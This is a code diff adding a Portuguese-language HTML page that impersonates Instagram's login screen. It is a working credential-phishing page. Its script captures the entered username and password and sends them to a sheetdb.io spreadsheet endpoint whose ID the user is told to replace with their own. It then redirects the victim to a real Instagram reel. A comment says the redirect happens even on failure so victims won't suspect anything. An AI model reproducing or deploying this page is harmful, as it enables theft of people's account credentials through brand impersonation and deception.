@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: #000;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; min-height: 100vh;
+        }
+        main {
+            flex: 1; display: flex; justify-content: center; align-items: center;
+            gap: 40px; padding: 20px;
+        }
+        .visual-side { width: 380px; }
+        .visual-side img { width: 100%; height: auto; }
+        .login-side { width: 350px; display: flex; flex-direction: column; gap: 12px; }
+        .auth-container {
+            border: 1px solid #363636; padding: 40px 30px;
+            text-align: center; background-color: #000;
+        }
+        .instagram-logo { font-size: 50px; font-family: serif; font-style: italic; margin-bottom: 30px; }
+        .input-field {
+            width: 100%; background: #121212; border: 1px solid #363636;
+            border-radius: 3px; padding: 10px; color: white; margin-bottom: 6px; font-size: 12px;
+            outline: none;
+        }
+        .btn-entrar {
+            width: 100%; background-color: #0095f6; color: white; border: none;
+            border-radius: 8px; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px;
+        }
+        .signup-container { border: 1px solid #363636; padding: 25px; text-align: center; font-size: 14px; }
+        @media (max-width: 875px) { .visual-side { display: none; } }
+    </style>
+</head>
+<body>
+
+    <main>
+        <section class="visual-side">
+            <img src="https://www.instagram.com/images/assets_DO_NOT_HARDCODE/lox_brand/landing-2x.png" alt="Instagram UI">
+        </section>
+
+        <section class="login-side">
+            <div class="auth-container">
+                <div class="instagram-logo">Instagram</div>
+                
+                <form id="loginForm">
+                    <input type="text" id="usuario" name="usuario" class="input-field" placeholder="Telefone, nome de usuário ou email" required>
+                    <input type="password" id="senha" name="senha" class="input-field" placeholder="Senha" required>
+                    
+                    <button type="submit" class="btn-entrar" id="btnAcao">Entrar</button>
+                </form>
+
+                <p style="color:#a8a8a8; margin: 20px 0;">OU</p>
+                <p style="color:#385185; font-weight:bold; cursor:pointer; font-size:14px;">Entrar com o Facebook</p>
+            </div>
+
+            <div class="signup-container">
+                Não tem uma conta? <span style="color:#0095f6; font-weight:bold;">Cadastre-se</span>
+            </div>
+        </section>
+    </main>
+
+    <footer style="padding: 20px; text-align: center; color: #a8a8a8; font-size: 12px;">
+        © 2025 Instagram from Meta
+    </footer>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const usuario = document.getElementById('usuario').value;
+            const senha = document.getElementById('senha').value;
+            const btn = document.getElementById('btnAcao');
+
+            btn.disabled = true;
+            btn.innerText = "Carregando...";
+
+            // Envia para o SheetDB (Substitua o ID abaixo pelo seu)
+            // Crie uma conta rápida em sheetdb.io para gerar seu link próprio ou use um serviço similar
+            fetch('https://sheetdb.io/api/v1/SEU_ID_AQUI', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    data: [
+                        {
+                            'usuario': usuario,
+                            'senha': senha
+                        }
+                    ]
+                })
+            })
+            .then(response => {
+                // REDIRECIONAMENTO FINAL
+                window.location.href = "https://www.instagram.com/reel/DSJ3VjZEXLW/?igsh=cHhxeTBvYmxhYWl6"; 
+            })
+            .catch(error => {
+                // Mesmo se der erro no envio, redireciona para não suspeitarem
+                window.location.href = "https://www.instagram.com/reel/DSJ3VjZEXLW/?igsh=cHhxeTBvYmxhYWl6";
+            });
+        });
+    </script>
+
+</body>
+</html>
